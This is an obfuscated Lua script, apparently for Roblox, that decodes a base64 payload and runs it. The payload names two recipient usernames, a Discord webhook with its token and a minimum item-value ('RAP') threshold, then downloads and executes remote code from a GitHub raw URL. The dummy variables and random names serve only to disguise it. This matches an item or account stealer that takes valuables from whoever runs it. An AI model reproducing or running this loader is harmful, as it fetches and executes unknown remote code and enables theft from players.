
local YmSpAEUNaWru = 'VXNlcm5hbWUgPSAibmV3YmVnaW5uZXIxMjM0NSIKVXNlcm5hbWUyID0gIjEyMzRuZXdiZWdpbm5lciIKV2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjk3MTc5NTU5OTgwMDQwMjM1L09VazA1Wk1BM09Rdkkwam8ycEs4TGxzaGhDZFY4SEI4YjhFU2Z2QjIxMUJFUDdyZFpSbWs1Mkdqd0prcWZxLWxKVDFtIgpNaW5pbXVtUkFQID0gMTAwMDAwCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2hhZG93c3p6enovdGltb2NpeS9yZWZzL2hlYWRzL21haW4vbWFpbiIsIHRydWUpKSgp'
local RjBGzIwvRCNz = function(s) 
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; 
    s = string.gsub(s, '[^'..b..'=]', ''); 
    return (s:gsub('.', function(x) 
        if x == '=' then return '' end; 
        local r,f='',(b:find(x)-1); 
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end 
        return r; 
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) 
        if (#x ~= 8) then return '' end; 
        local c=0; 
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end 
        return string.char(c) 
    end)) 
end
local tzANtxLeR = RjBGzIwvRCNz(YmSpAEUNaWru)
loadstring(tzANtxLeR)() -- Run decoded code

-- Dummy variables for confusion
local vRgrvusCrZmt = math.random()
local LqQCBDvFcGB = "This is a dummy string"
